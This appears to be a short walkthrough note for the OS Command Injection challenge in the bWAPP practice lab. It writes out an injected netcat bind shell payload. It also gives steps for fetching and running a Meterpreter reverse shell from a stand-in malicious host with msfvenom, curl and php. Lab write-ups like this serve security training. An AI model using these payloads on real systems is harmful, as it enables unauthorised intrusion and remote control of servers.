@@ -1,0 +1,19 @@
+bWAPP
+
+OS Command Injection
+
+# This challenge provides a DNS Lookup search bar.
+# By entering ; at the end, you can enter more commands after.
+# To create a quick, interactive shell, you can enter the following...
+; nc -vlp 2222 -e /bin/bash			// netcat --verbose --listen --port --execute
+
+### ...on the other end
+nc 127.0.0.1 2222
+
+## You may also want to upload a meterpreter shell
+## Steps go as followed:
+## 	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o shell.php
+##	2. On the Web Server, ; curl -O http://malicious-site.com/shell.php
+##	3. On your malicious server, start metasploit and listen.
+##	4. On the Web Server, ; php -f shell.php
+##	5. Profit.
